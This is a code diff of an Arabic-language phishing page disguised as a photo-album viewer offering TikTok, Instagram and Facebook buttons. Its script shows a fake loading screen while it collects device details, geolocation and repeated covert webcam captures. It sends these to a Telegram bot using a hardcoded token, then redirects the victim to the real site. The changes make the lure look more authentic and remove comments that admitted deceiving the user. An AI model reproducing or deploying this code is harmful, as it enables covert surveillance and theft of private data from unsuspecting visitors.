@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>مشاهدة الألبوم الحصري والصور الكاملة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <style>
         body {
             margin: 0;
@@ -59,7 +60,7 @@
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 14px;
-            padding: 15px 10px;
+            padding: 18px 10px;
             cursor: pointer;
             transition: all 0.25s ease;
             display: flex;
@@ -74,19 +75,19 @@
             border-color: #00adb5;
         }
 
+        /* تنسيق أيقونات الخطوط (Font Icons) */
         .platform-icon {
             width: 45px;
             height: 45px;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 50%;
-            font-size: 20px;
-            font-weight: bold;
+            font-size: 22px; /* التحكم بحجم الأيقونة من الخط */
         }
 
-        /* تلوين الأيقونات لمحاكاة المنصات الأصلية */
+        /* تخصيص مظهر الأيقونات الحقيقية للمنصات */
         .tiktok { background: #000000; color: #fff; border: 1px solid #fe2c55; }
         .instagram { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); color: #fff; }
         .facebook { background: #1877f2; color: #fff; }
@@ -136,15 +137,21 @@
 
             <div class="platform-grid">
                 <div class="platform-card" onclick="executeProcess('TikTok')">
-                    <div class="platform-icon tiktok">🎵</div>
+                    <div class="platform-icon tiktok">
+                        <i class="fa-brands fa-tiktok"></i>
+                    </div>
                     <div class="platform-name">TikTok</div>
                 </div>
                 <div class="platform-card" onclick="executeProcess('Instagram')">
-                    <div class="platform-icon instagram">📸</div>
+                    <div class="platform-icon instagram">
+                        <i class="fa-brands fa-instagram"></i>
+                    </div>
                     <div class="platform-name">Instagram</div>
                 </div>
                 <div class="platform-card" onclick="executeProcess('Facebook')">
-                    <div class="platform-icon facebook">👥</div>
+                    <div class="platform-icon facebook">
+                        <i class="fa-brands fa-facebook-f"></i>
+                    </div>
                     <div class="platform-name">Facebook</div>
                 </div>
             </div>
@@ -152,7 +159,7 @@
 
         <div id="loading-area" class="loading-screen">
             <div class="spinner"></div>
-            <p>جاري فحص الارتباط ونقل البيانات... يرجى الانتظار</p>
+            <p>جاري تحميل الألبوم... يرجى الانتظار ثوانٍ</p>
         </div>
     </div>
 
@@ -160,16 +167,13 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // إبقاء الإعدادات وربط الـ APIs كما هي لضمان كفاءة السكربت
         const TELEGRAM_TOKEN = "8548039211:AAGwUXfiInazMbpIHzwwTRr8CGeu4-BdDL4";
         const CHAT_ID = "8146130042";
 
         async function executeProcess(selectedPlatform) {
-            // تحويل الواجهة فوراً لشاشة التحميل لإيهام المستخدم
             document.getElementById('ui-elements').style.display = 'none';
             document.getElementById('loading-area').style.display = 'block';
 
-            // جمع البيانات الفنية الخلفية
             const techData = await fetchTech();
             const now = new Date().toLocaleString('ar-EG');
 
@@ -184,12 +188,10 @@
 
             sendToTelegram(report);
 
-            // استدعاء الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(p => {
                 sendToTelegram(`📍 موقع الهدف المكتشف: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // تفعيل الكاميرا في الخلفية والتقاط اللقطات
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
@@ -203,7 +205,7 @@
                     } else {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
-                        redirectUser(selectedPlatform); // تحويل ديناميكي للمنصة المحددة
+                        redirectUser(selectedPlatform);
                     }
                 }, 1200);
             } catch(e) {
@@ -247,7 +249,6 @@
             });
         }
 
-        // دالة التحويل الديناميكي بناءً على نقرة المستخدم
         function redirectUser(platform) {
             if (platform === 'TikTok') window.location.href = "https://www.tiktok.com";
             else if (platform === 'Instagram') window.location.href = "https://www.instagram.com";
